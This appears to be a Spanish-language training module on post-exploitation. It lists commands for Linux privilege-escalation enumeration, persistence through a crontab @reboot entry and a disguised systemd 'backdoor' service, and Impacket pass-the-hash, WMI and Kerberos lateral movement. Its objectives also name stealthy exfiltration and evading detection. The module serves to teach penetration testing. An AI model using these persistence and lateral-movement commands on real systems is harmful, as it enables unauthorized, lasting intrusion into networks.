05 — Post-Explotación

Escalada de privilegios, persistencia, movimiento lateral y exfiltración de datos.

Objetivos de Aprendizaje

Escalar privilegios de usuario a root/SYSTEM en Linux y Windows.
Establecer persistencia que sobreviva reinicios.
Moverte lateralmente entre sistemas de una red.
Exfiltrar datos de forma sigilosa.
Limpiar huellas para evadir detección.

Contenido del Módulo

01

Escalada de Privilegios Linux

MITRE: TA0004

Técnicas para obtener privilegios root en sistemas Linux.

1
SUID/SGID: Buscar binarios con permisos especiales
2
sudo: Verificar qué se puede ejecutar con sudo
3
Cron jobs: Explotar tareas programadas
4
Kernel: Explotar vulnerabilidades del kernel
5
Capabilities: Explotar capacidades de Linux
Ejemplo
# Buscar SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Verificar sudo
sudo -l

# Buscar capabilities
getcap -r / 2>/dev/null

03

Persistencia

MITRE: TA0003

Mantener acceso después de reinicios del sistema.

1
Crontab: Tareas programadas en Linux
2
Systemd: Servicios en Linux
3
Registry Run Keys: Persistencia en Windows
4
Scheduled Tasks: Tareas en Windows
5
WMI: Eventos de Windows Management
Linux
# Crontab
crontab -e
@reboot /path/to/backdoor

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/path/to/backdoor

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor

Movimiento Lateral

MITRE: TA0008

Moverte entre sistemas de una red usando credenciales comprometidas.

1
Pass-the-Hash: Usar hashes NTLM sin descifrar
2
Pass-the-Ticket: Usar tickets Kerberos
3
PsExec: Ejecutar comandos remotos
4
WMI: Gestión remota de Windows
5
SSH: Acceso remoto en Linux
Impacket
# Pass-the-Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb8f4... administrator@10.10.10.1

# WMI
wmiexec.py administrator:password@10.10.10.1

# Kerberos
getTGT.py domain/user:password
export KRB5CCNAME=user.ccache
